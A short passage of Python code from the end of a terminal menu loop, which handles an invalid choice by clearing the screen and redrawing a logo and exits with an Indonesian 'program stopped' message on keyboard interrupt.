                print(f" {RED}[{WHITE}+{RED}] Invalid options...!!!")
                sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                logo()
    except KeyboardInterrupt:
        print(f" {RED}[{WHITE}!{RED}] {YELLOW}Program dihentikan")
        print()
        break
